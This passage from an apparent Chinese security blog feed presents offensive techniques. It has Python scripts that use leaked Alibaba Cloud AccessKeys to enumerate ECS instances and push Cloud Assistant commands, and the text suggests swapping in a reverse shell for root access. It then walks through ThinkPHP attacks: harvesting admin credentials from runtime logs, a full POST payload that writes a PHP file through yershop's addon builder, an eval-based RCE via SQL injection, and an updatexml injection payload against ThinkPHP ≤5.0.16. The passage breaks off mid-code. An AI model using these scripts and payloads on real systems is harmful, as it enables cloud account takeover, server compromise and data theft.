class="token string">'LTxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxxx'</span><span class="token punctuation">,</span> RegionIdes<span class="token punctuation">[</span>RegionId<span class="token punctuation">]</span><span class="token punctuation">)</span>    request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>    request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    response <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> Instance <span class="token keyword">in</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                priip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'PrivateIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>            priip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                pubip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>                pubip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            osname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insId <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span>        res <span class="token operator">=</span> <span class="token string">'主机名称:{}&lt;--->操作系统:{}&lt;--->内网IP:{}&lt;--->公网IP:{}&lt;--->网络@{}&lt;--->InstanceId:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>insname<span class="token punctuation">,</span> osname<span class="token punctuation">,</span>str<span class="token punctuation">(</span>priip<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>pubip<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>RegionId<span class="token punctuation">)</span><span class="token punctuation">,</span>insId<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/4.png" alt="" loading="lazy"></p><ol start="2"><li>使用CreateCommand新建一条云助手命令（CreateCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/5.png" alt="" loading="lazy"></p><p>RegionId代表区域；Name为命令名称，支持全字符集，长度不得超过128个字符；</p><p>Type为命令的类型：</p><pre><code>RunBatScript：创建一个在Windows实例中运行的 Bat 脚本。 RunPowerShellScript：创建一个在Windows实例中运行的PowerShell脚本。 RunShellScript：创建一个在Linux实例中运行的Shell脚本。</code></pre><p>CommandContent为需要执行的命令，base64进行传输的，一般不超过16k</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> base64<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>CreateCommandRequest <span class="token keyword">import</span> CreateCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxnxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> CreateCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Name<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Type<span class="token punctuation">(</span><span class="token string">"RunShellScript"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandContent<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'需要执行的命令'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>执行脚本输出</p><pre><code>{&quot;RequestId&quot;:&quot;C5A79885-6377-4785-86C6-9CA7FCXXXXX&quot;,&quot;CommandId&quot;:&quot;c-hz0xxxx&quot;}</code></pre><ol start="3"><li>利用DescribeCommands查询您已经创建的云助手命令（DescribeCommands.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/6.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeCommandsRequest <span class="token keyword">import</span> DescribeCommandsRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeCommandsRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0xxxxx"</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># python2:  print(response) </span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ol start="4"><li>利用InvokeCommand为一台或多台ECS实例触发一条云助手命令（InvokeCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/7.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果，InstanceId为需要执行命令的实例列表，就是上面第一个脚本获取到的InstanceId</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>InvokeCommandRequest <span class="token keyword">import</span> InvokeCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> InvokeCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0uxxxxx"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_InstanceIds<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"i-bp1xxxxxxx"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>只需要将CreateCommand.py脚本的命令换成反弹shell的命令，在利用InvokeCommand执行命令就可以反弹一个最高权限的shell。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>关于ThinkPHP的一些渗透方式</title>
    <link href="http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/"/>
    <id>http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-16T16:00:00.000Z</published>
    <updated>2020-08-17T09:29:35.804Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Runtime日志"><a href="#Runtime日志" class="headerlink" title="Runtime日志"></a><strong>Runtime日志</strong></h4><p>在ThinkPHP3的版本中，入口文件index.php是跟应用目录，框架目录是同一个目录下的，在DEBUG开启的状态下，会在runtime生成日志文件，会泄露一些管理员登录后台的账号密码等。tp3的日志文件命名规则为：根目录(或者应用目录)/Runtime/Logs/Admin/20_08_17.log（年份前2位_月份_日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/1.png" alt="" loading="lazy"></p><p>在tp5的版本中，入口文件index是在public的目录下，它跟应用目录，框架目录不在同一个目录，但是有些管理员会将入口文件放置到跟应用目录，框架目录同目录，tp5的命名规则为：./runtime/log/202008/17.log（./runtime/log/年月/日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/2.png" alt="" loading="lazy"></p><h4 id="file-put-contents函数"><a href="#file-put-contents函数" class="headerlink" title="file_put_contents函数"></a><strong>file_put_contents函数</strong></h4><p>在thinkphp3中，后台有很多时候都会有写入配置文件来getshell的，所以我总是喜欢全局查找这个file_put_contents这个函数，然后我在网上找了个代码–yershop(TP3开发的那个版本)来进行审计，后台可以通过写入文件来拿shell。全局查找file_put_contents函数，发现控制器AddonsController.class.php中的build存在</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/4.png" alt="" loading="lazy"></p><p>发现存在两处写入文件，这里第一处需要满足以下条件：</p><pre><code>$addon_dir可控,$data可控,$addonModel可控</code></pre><p>第二处需要满足：</p><pre><code>$data[&#39;has_config&#39;] == 1,$addon_dir可控</code></pre><p>跟踪发现$data是从全局POST获取的，所有可控，即$addon_dir可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/5.png" alt="" loading="lazy"></p><p>构造payload如下，后台创建扩展</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/6.png" alt="" loading="lazy"></p><p>点击确定，抓包，首先会判断标识名这个插件是否存在，不存在就执行build访问</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/7.png" alt="" loading="lazy"></p><p>由于要写入config.php这个文件需要满足$data[‘has_config’] == 1，最后构造payload</p><p>访问：index.php?s=/Admin/Addons/build.html              POST发送：</p><pre><code>info%5Bname%5D=Example&amp;info%5Btitle%5D=%E7%A4%BA%E5%88%97&amp;info%5Bversion%5D=0.1&amp;info%5Bauthor%5D=%E6%97%A0%E5%90%8D&amp;info%5Bdescription%5D=%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%B4%E6%97%B6%E6%8F%8F%E8%BF%B0&amp;info%5Bstatus%5D=1&amp;config=%3C%3Fphp%0D%0Areturn+array(%0D%0A%09&#39;random&#39;%3D%3Earray(%2F%2F%E9%85%8D%E7%BD%AE%E5%9C%A8%E8%A1%A8%E5%8D%95%E4%B8%AD%E7%9A%84%E9%94%AE%E5%90%8D+%2C%E8%BF%99%E4%B8%AA%E4%BC%9A%E6%98%AFconfig%5Brandom%5D%0D%0A%09%09&#39;title&#39;%3D%3E&#39;%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF%E9%9A%8F%E6%9C%BA%3A&#39;%2C%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E6%96%87%E5%AD%97%0D%0A%09%09&#39;type&#39;%3D%3E&#39;radio&#39;%2C%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E7%B1%BB%E5%9E%8B%EF%BC%9Atext%E3%80%81textarea%E3%80%81checkbox%E3%80%81radio%E3%80%81select%E7%AD%89%0D%0A%09%09&#39;options&#39;%3D%3Earray(%09%09+%2F%2Fselect+%E5%92%8Cradion%E3%80%81checkbox%E7%9A%84%E5%AD%90%E9%80%89%E9%A1%B9%0D%0A%09%09%09&#39;1&#39;%3D%3E&#39;%E5%BC%80%E5%90%AF&#39;%2C%09%09+%2F%2F%E5%80%BC%3D%3E%E6%96%87%E5%AD%97%0D%0A%09%09%09&#39;0&#39;%3D%3E&#39;%E5%85%B3%E9%97%AD&#39;%2C%0D%0A%09%09)%2C%0D%0A%09%09&#39;value&#39;%3D%3E&#39;1&#39;%2C%09%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E9%BB%98%E8%AE%A4%E5%80%BC%0D%0A%09)%2C%0D%0A)%3B%0D%0A%09%09%09%09%09&amp;custom_config=&amp;admin_list=&#39;model&#39;%3D%3E&#39;Example&#39;%2C%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E8%A1%A8%0D%0A%09%09%09&#39;fields&#39;%3D%3E&#39;*&#39;%2C%09%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E5%AD%97%E6%AE%B5%0D%0A%09%09%09&#39;map&#39;%3D%3E&#39;&#39;%2C%09%09%09%09%2F%2F%E6%9F%A5%E8%AF%A2%E6%9D%A1%E4%BB%B6%2C+%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E5%8F%AF%E4%BB%A5%E5%86%8D%E6%8F%92%E4%BB%B6%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E9%87%8C%E5%8A%A8%E6%80%81%E9%87%8D%E7%BD%AE%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%0D%0A%09%09%09&#39;order&#39;%3D%3E&#39;id+desc&#39;%2C%09%09%2F%2F%E6%8E%92%E5%BA%8F%2C%0D%0A%09%09%09&#39;list_grid&#39;%3D%3Earray(+%09%09%2F%2F%E8%BF%99%E9%87%8C%E5%AE%9A%E4%B9%89%E7%9A%84%E6%98%AF%E9%99%A4%E4%BA%86id%E5%BA%8F%E5%8F%B7%E5%A4%96%E7%9A%84%E8%A1%A8%E6%A0%BC%E9%87%8C%E5%AD%97%E6%AE%B5%E6%98%BE%E7%A4%BA%E7%9A%84%E8%A1%A8%E5%A4%B4%E5%90%8D%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%B8%80%E6%A0%B7%E6%94%AF%E6%8C%81%E5%87%BD%E6%95%B0%E5%92%8C%E9%93%BE%E6%8E%A5%0D%0A++++++++++++++++&#39;cover_id%7Cpreview_pic%3A%E5%B0%81%E9%9D%A2&#39;%2C%0D%0A++++++++++++++++&#39;title%3A%E4%B9%A6%E5%90%8D&#39;%2C%0D%0A++++++++++++++++&#39;description%3A%E6%8F%8F%E8%BF%B0&#39;%2C%0D%0A++++++++++++++++&#39;link_id%7Cget_link%3A%E5%A4%96%E9%93%BE&#39;%2C%0D%0A++++++++++++++++&#39;update_time%7Ctime_format%3A%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4&#39;%2C%0D%0A++++++++++++++++&#39;id%3A%E6%93%8D%E4%BD%9C%3A%5BEDIT%5D%7C%E7%BC%96%E8%BE%91%2C%5BDELETE%5D%7C%E5%88%A0%E9%99%A4&#39;%0D%0A++++++++++++)%2C%0D%0A%09%09%09%09%09&amp;custom_adminlist=&amp;has_config=1&amp;config=&lt;?php phpinfo();?&gt;</code></pre><p>成功写入config.php文件，访问Addons/Example/config.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/8.png" alt="" loading="lazy"></p><p>所以，在TP3开发的源码中，全局查找file_put_contents很容易中奖。</p><h4 id="Auth引发的RCE"><a href="#Auth引发的RCE" class="headerlink" title="Auth引发的RCE"></a><strong>Auth引发的RCE</strong></h4><p>在tp3中，在Auth的getAuthList方法存在eval函数，跟进代码ThinkPHP\Library\Think\Auth.class.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/7.png" alt="" loading="lazy"></p><p>这里需要满足$command变量可控就可以rce了，$command为[表前缀]_auth_rule的condition字段，这里我还是以yershop源码来分析，控制权限的表为yershop_auth_rule。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/8.png" alt="" loading="lazy"></p><p>所以，漏洞触发需要向condition字段写入我们的恶意代码，要利用注入且支持pdo就能写入进去，tp3是以pdo来连接数据库的，这里满足了pdo，就需要寻找注入点来getshell了。</p><p>在文件Application\Home\Controller\OrderController.class.php中的detail方法，通过<strong>I</strong>方法获取id参数。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/9.png" alt="" loading="lazy"></p><p>利用pdo修改condition字段</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/10.png" alt="" loading="lazy"></p><p>继续分析，是怎么调用到getAuthList这个方法的，在Application\Admin\Controller\AdminController.class.php控制器中，调用了checkRule方法，在checkRule方法实列了Auth类，并调用了check方法。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/11.png" alt="" loading="lazy"></p><p>跟进check方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/12.png" alt="" loading="lazy"></p><p>在104行调用了我们的getAuthList方法，执行到了eval函数处。要触发rce，从代码中可以看到需要普通用户的权限才会执行到checkRule方法，所以先添加一个新用户并新增一个用户组，给它文章管理的权限。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/13.png" alt="" loading="lazy"></p><p>登录这个用户，访问我们注入修改的路由，成功rce</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/14.png" alt="" loading="lazy"></p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>在TP3.1.3和TP3.2.3注入都差不多，无非就表达式注入，bind注入，find/select/delete注入，order注入，在之前的<a href="https://bbs.ichunqiu.com/thread-56035-1-1.html" target="_blank" rel="noopener">文章</a>中，分析过关于tp3.2.3的注入，这里我就不在多说了。这里主要是TP5的注入。</p><h5 id="ThinkPHP-lt-5-0-16-insert-update注入"><a href="#ThinkPHP-lt-5-0-16-insert-update注入" class="headerlink" title="ThinkPHP&lt;=5.0.16 insert/update注入"></a><strong>ThinkPHP&lt;=5.0.16 insert/update注入</strong></h5><p>在ThinkPHP5中，获取请求方式的方法是input，在控制器中，写个存在漏洞的demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'get.username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>漏洞payload</p><pre><code>username[0]=dec&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/17.png" alt="" loading="lazy"></p><p>在user变量处，断点进行分析，直接进入update方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/18.png" alt="" loading="lazy"></p><p>继续跟进$this-&gt;builder-&gt;update</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/19.png" alt="" loading="lazy"></p><p>在parseData方法中，进行了sql语句的拼接</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/20.png" alt="" loading="lazy"></p><p>当参数传入数组的时候，下标0为exp时候，直接返回下标为1的参数值，而为inc或者dec时候，通过parseKey方法处理了下标为1的参数值，跟进查看parseKey方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'$.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// JSON字段支持</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'$.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$key</span>                <span class="token operator">=</span> <span class="token string">'json_extract('</span> <span class="token punctuation">.</span> <span class="token variable">$field</span> <span class="token punctuation">.</span> <span class="token string">', \'$.'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token string">'\')'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\(\)`\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'__TABLE__'</span> <span class="token operator">==</span> <span class="token variable">$table</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\*\(\)`.\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span> <span class="token punctuation">.</span> <span class="token string">'`'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 